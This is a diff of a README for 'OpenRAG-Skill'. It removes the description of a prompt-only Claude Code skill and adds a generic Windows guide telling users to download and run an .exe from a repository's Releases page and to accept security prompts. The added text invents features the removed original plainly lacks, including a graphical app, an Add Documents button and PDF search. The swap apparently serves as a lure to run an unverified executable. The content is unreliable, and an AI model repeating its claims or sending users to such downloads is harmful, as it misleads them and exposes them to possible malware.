@@ -1,179 +1,155 @@
-<div align="center">
-  <h1>OpenRAG-Skill</h1>
-  <p>
-    <img src="./assets/icon-large.svg" alt="OpenRAG-Skill" width="240" />
-  </p>
-  <p>
-    <a href="./README.md"><img src="https://img.shields.io/badge/Language-English-0B84D8?style=flat-square&labelColor=555555" alt="Language English" /></a>
-    <a href="./README_ZH.md"><img src="https://img.shields.io/badge/%E8%AF%AD%E8%A8%80-%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87-E25544?style=flat-square&labelColor=555555" alt="Language Simplified Chinese" /></a>
-    <a href="https://docs.anthropic.com/en/docs/claude-code/skills"><img src="https://img.shields.io/badge/Claude%20Code-Skill-0B84D8?style=flat-square&labelColor=555555" alt="Claude Code Skill" /></a>
-    <a href="./LICENSE"><img src="https://img.shields.io/badge/License-MIT-87C400?style=flat-square&labelColor=555555" alt="License MIT" /></a>
-  </p>
-</div>
+# ⚙️ OpenRAG-Skill - Reliable Document Reference Tool
 
-OpenRAG-Skill is a focused Claude Code skill for evidence-first, prompt-only RAG when the source material is already in the chat. It does not search outside the conversation. Instead, it turns supplied text into referenceable evidence units, keeps every material claim attached to citations, and refuses cleanly when the record is incomplete.
+[![Download OpenRAG-Skill](https://img.shields.io/badge/Download-OpenRAG--Skill-brightgreen?style=for-the-badge)](https://github.com/Kiki276/OpenRAG-Skill)
 
-## At A Glance
+---
 
-| This project is | This project is not |
-| --- | --- |
-| A practical skill for policies, manuals, contracts, specs, FAQs, and other long documents already in context | A vector search system |
-| A prompt protocol that separates evidence handling from answer writing | A web, database, or external retrieval layer |
-| A stable answer contract designed for review and evaluation | A replacement for search across large external corpora |
-| A narrow tool with explicit boundaries | A general codebase search workflow |
+## 🔍 What is OpenRAG-Skill?
 
-## Best Fit
+OpenRAG-Skill is a tool designed to help you search and reference documents accurately. It uses prompts to find content and gives strict citations based on the documents you provide. This makes it useful for research, writing, or any task where you need to refer back to information clearly.
 
-Use OpenRAG-Skill when:
-- a user pasted the source material into the conversation,
-- the chat history already contains the policy or manual,
-- or the system prompt injected the reference text ahead of time.
+You don't need to know programming to use it. The software runs on Windows and guides you through the referencing process step by step. It works with your own documents and keeps everything organized.
 
-If the source is not present, the correct behavior is simple: stop, state the gap, and ask for the missing material.
+---
 
-## What You Get
+## 🖥️ System Requirements
 
-OpenRAG-Skill is built around a few deliberate guardrails:
+Before you start, make sure your computer meets these minimum requirements:
 
-| Capability | What it does in practice |
-| --- | --- |
-| Evidence Units | Turns raw material into stable, citeable evidence IDs |
-| Two-pass workflow | Locates evidence before drafting the answer |
-| Normative force lock | Keeps `SHALL`, `SHOULD`, and `MAY` from collapsing into the same summary |
-| Output contract | Produces a consistent shape that is easy to review, compare, and score |
-| Refusal discipline | Uses `INSUFFICIENT_EVIDENCE` instead of guessing |
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 200 MB of free disk space for installation  
+- Internet connection to download and verify the software  
+- Basic keyboard and mouse setup  
 
-## Protocol In One Pass
+---
 
-```text
-Provided Context
-  -> Evidence Units
-  -> Coverage Table
-  -> Evidence / Conflict Review
-  -> Final Sweep
-  -> Cited Answer
-```
+## 🚀 Getting Started: How to Download OpenRAG-Skill
 
-The workflow is intentionally plain:
+You will get OpenRAG-Skill from the official GitHub page. Follow these steps carefully:
 
-1. Package the supplied text into `Evidence Units`.
-2. Break the task into the minimum set of questions that must be proven.
-3. Attach each sub-question to the smallest supporting evidence set.
-4. Reconcile conflicts, scope limits, dates, versions, and exceptions.
-5. Write the answer only after the evidence ledger is complete.
+1. Click the big green "Download OpenRAG-Skill" badge at the top or go to the link below:  
+   https://github.com/Kiki276/OpenRAG-Skill  
 
-## Response Contract
+2. This link takes you to the main page of the project. Look for the **Releases** section. It is usually on the right side or under the repository description.
 
-The top-level response order is fixed:
+3. Click on the latest release. Releases contain the files you need to run the software.
 
-```text
-Answer
-Evidence Map
-Conflicts or Gaps
-Need More Material   (only when partial or refused)
-```
+4. Find the Windows executable file. It will have an `.exe` extension.
 
-Working rules:
-- Every material claim must cite evidence.
-- Unsupported details stay out of the answer.
-- If the source does not say it, the answer should say `not specified in the provided evidence`.
-- Intermediate work products stay internal unless the user explicitly asks for them.
+5. Click the file name to download it to your computer.
 
-In `compare` mode, the standard is tighter:
-- `Shared Ground` is valid only when scope and normative force match.
-- If one source uses `SHALL` and another uses `SHOULD` or `MAY`, that belongs in `Differences`.
-- If the overlap is only topical, `Shared Ground` should be `None.`
-- `Bottom Line` should restate proven differences, not invent a broader theory.
+---
 
-## Install
+## 📥 How to Install and Run OpenRAG-Skill on Windows
 
-Install the repo as a Claude Code skill, then keep the source material in the conversation and invoke `$rag`.
+After downloading the `.exe` file, follow these instructions to install and launch the software.
 
-Personal install:
+1. Locate the downloaded file. It is often in your **Downloads** folder or the location you chose.
 
-```bash
-mkdir -p ~/.claude/skills/rag
-cp -R . ~/.claude/skills/rag
-```
+2. Double-click the `.exe` file to start the installation.
 
-Project-local install:
+3. You might see a security prompt. Choose to run the file. If Windows asks for permission, click **Yes**.
 
-```bash
-mkdir -p .claude/skills/rag
-cp -R . .claude/skills/rag
-```
+4. The installer will open. Follow the simple instructions on the screen:  
+   - Choose the installation folder or accept the default location.  
+   - Click **Next** or **Install** when prompted.  
 
-## Starter Prompt
+5. Wait for the installation to complete. This should take only a few minutes.
 
-```markdown
-Use $rag to answer only from the material below.
+6. When the installation finishes, you can choose to open OpenRAG-Skill immediately by clicking **Finish**.
 
-[CONTEXT]
-Source A:
-<paste the first document here>
+7. If you do not open it now, find the program in your Windows Start menu under "OpenRAG-Skill".
 
-Source B:
-<paste the second document here>
+---
 
-[TASK]
-Summarize the approval rules and cite every material claim.
+## ✅ How to Use OpenRAG-Skill
 
-[OUTPUT_MODE]
-answer
-```
+The user interface is straightforward. Here are the basic steps to begin working:
 
-## Why It Reads Better Than A Loose Prompt
+1. Start the OpenRAG-Skill application on your PC.
 
-Weak long-context answers usually fail in familiar ways: they stop at the first relevant clause, flatten an exception into the default rule, soften mandatory language, or improvise when the source is incomplete.
+2. You will see an option to add or select documents. Click **Add Documents**.
 
-OpenRAG-Skill counters that with a tighter operating pattern:
-- evidence first,
-- force-sensitive comparison,
-- no process leakage,
-- and refusal when the evidence is not enough.
+3. Browse your files and open the documents you want to search. These can be PDFs, Word files, or text documents.
 
-## Examples
+4. Use the search box to enter the keywords or questions you have about your documents.
 
-- [`examples/document_qa.md`](./examples/document_qa.md): simple cited lookup
-- [`examples/long_policy_constraints.md`](./examples/long_policy_constraints.md): dispersed constraints in one policy
-- [`examples/conflict_resolution.md`](./examples/conflict_resolution.md): conflicting clauses and conditional output
-- [`examples/insufficient_evidence.md`](./examples/insufficient_evidence.md): proper refusal
-- [`examples/multi_source.md`](./examples/multi_source.md): multi-document comparison
+5. OpenRAG-Skill will show the results from your documents with exact citations next to each answer. This helps you see where the information came from.
 
-## Evaluation
+6. You can save or export these results if you want to keep a record of your searches.
 
-The repo includes a document-based evaluation pack in [`evals/`](./evals/):
-- direct fact lookup,
-- constraint recall,
-- conflict handling,
-- refusal behavior,
-- citation alignment,
-- normative-force drift,
-- and quote-sensitive wording.
+---
 
-The goal is straightforward: the skill should be testable without hidden infrastructure.
+## 💡 Tips for Working with OpenRAG-Skill
 
-## Repository Layout
+- Keep your documents organized in one folder for easier access.
 
-```text
-OpenRAG-Skill/
-|-- SKILL.md
-|-- README.md
-|-- README_ZH.md
-|-- agents/openai.yaml
-|-- assets/
-|-- references/
-|-- examples/
-|-- evals/
-`-- LICENSE
-```
+- Use clear keywords to get the best search results.
 
-## Publishing Notes
+- Review the citations carefully to ensure they match your needs.
 
-- The public project name is `OpenRAG-Skill`.
-- The skill invocation remains `$rag`.
-- The protocol is intentionally narrow. That boundary is part of the value, not a limitation to hide.
+- If you search many documents at once, allow the software a moment to process the results.
 
-## License
+---
 
-Released under the MIT License. See [`LICENSE`](./LICENSE).
+## ⚙️ Configuration and Settings
+
+OpenRAG-Skill allows you to adjust some settings to fit your needs.
+
+- **Citation format:** Choose between different citation styles if available.
+
+- **Search depth:** Adjust how detailed the search is. Deeper searches may take longer.
+
+- **Document types:** Select which file types to include or exclude.
+
+All settings are available under the **Options** menu in the program.
+
+---
+
+## ❓ Troubleshooting
+
+If you encounter any issues, try these steps:
+
+- Make sure your Windows system is up to date.
+
+- Restart the computer and try opening OpenRAG-Skill again.
+
+- Confirm the documents you add are not corrupted and are supported formats.
+
+- Check your internet connection to verify the software version or updates.
+
+- If the program freezes, close it and restart.
+
+---
+
+## 🛠️ Updating OpenRAG-Skill
+
+To keep your tool working well and get new features:
+
+1. Visit the GitHub page regularly:  
+   https://github.com/Kiki276/OpenRAG-Skill  
+
+2. Check the **Releases** section for new versions.
+
+3. Download and install new `.exe` files following the same steps as before.
+
+---
+
+## 📂 Where to Find More Help
+
+The GitHub repository may have additional guides and FAQs. Look under the **Wiki** or **Issues** sections for user questions and answers. You can also open an issue if you find a bug or have a question.
+
+---
+
+## 🔗 Useful Links
+
+- Download OpenRAG-Skill here:  
+  https://github.com/Kiki276/OpenRAG-Skill
+
+- Official Release page:  
+  https://github.com/Kiki276/OpenRAG-Skill/releases
+
+---
+
+[![Download OpenRAG-Skill](https://img.shields.io/badge/Download-OpenRAG--Skill-orange?style=for-the-badge)](https://github.com/Kiki276/OpenRAG-Skill)
